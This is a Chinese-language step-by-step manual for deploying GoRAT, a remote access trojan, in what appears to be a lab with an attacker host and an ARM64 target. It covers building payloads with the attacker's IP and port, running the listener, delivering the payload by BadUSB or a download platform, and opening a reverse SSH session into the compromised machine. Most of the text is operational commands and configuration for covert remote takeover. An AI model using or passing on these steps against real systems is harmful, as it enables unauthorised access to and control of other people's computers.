# GoRAT使用手册

> github链接：https://github.com/JustinTimperio/GoRAT
>
> GoRAT主要是由Go和Shell语言编写而成，支持生成arm架构下的Payload
>
> > [!NOTE]
> >
> > **攻击者主机**：简记为`A`
> >
> > `ip`：`192.168.59.207`
> >
> > `port`：`8888`
> >
> > **目标靶机**：简记为`V`
> >
> > `架构`：`Phytium-aarch64`(`linux-ARMv8`)

## `A`：GoRAT安装与环境配置

为了不影响本地环境，使用Docker环境进行安装配置。

### 设置Go代理

由于国内安装go语言的mod包时会出现被墙的问题，因此我们在执行：

```shell
git clone git@github.com:JustinTimperio/GoRAT.git
```

将仓库下载下来后，对`./Dockerfile`文件作如下修改：<img src="./GoRAT.assets/image-20240422233609677.png" alt="image-20240422233609677"  />

加入上述Go代理，使得在`Docker`内执行`go mod download -x`时可以正常下载mod包。

### 配置`./config.sh`

在`./config.sh`下配置攻击者主机`A`的`ip`以及`port`以生成可在目标靶机上使用的`payload`：<img src="./GoRAT.assets/image-20240422234924239.png" alt="image-20240422234924239"  />

### 进行构建

在仓库目录下运行：

```shell
./build_payload.sh --docker
```

生成的`payload`位于`./BUILD/payloads`目录下

根据目标靶机`V`的架构，选择`goRAT_v12_linux_arm64_ARM7`作为`payload`

![image-20240423000021814](./GoRAT.assets/image-20240423000021814.png)

### 配置运行监听程序

监听程序位置即：`./scripts/start_server.sh`

- 配置`A`的端口号为`8888`：![image-20240423000759616](./GoRAT.assets/image-20240423000759616.png)

- 运行该程序：<img src="./GoRAT.assets/image-20240423002048992.png" alt="image-20240423002048992" style="zoom:150%;" />

  运行后开始监听。





## `V`：获得`payload`并执行

### 具体步骤

即通过`BadUSB`的方式将`payload`传输至目标靶机`V`上

- 将`payload`隐藏至大容量存储设备中并在`V`中执行
- 将`payload`上载至可访问平台中，通过`BadUSB`从平台上下载并在`V`上运行

运行后，在`A`上显示控制程序和端口程序的运行端口：![image-20240423001949206](./GoRAT.assets/image-20240423001949206.png)

- 显示控制端口在`41460`运行
- 显示`ssh`在端口`41461`运行

### ps：如何关闭监听程序？

- 先获得对应端口上的程序的`PID`：

  ```shell
  sudo netstat -tulpn | grep :8888
  ```

  <img src="./GoRAT.assets/image-20240423003228915.png" alt="image-20240423003228915" style="zoom:150%;" />

- 杀死比尔：

  ```shell
  kill -SIGKILL 506656
  ```





## `A`：建立ssh连接

执行下述命令之一：

```shell
//default
ssh -v localhost -p 41461
//for phytium_pi 
ssh -o HostKeyAlgorithms=ssh-rsa localhost -p 41461
```

即可与目标靶机`V`建立`ssh`连接：

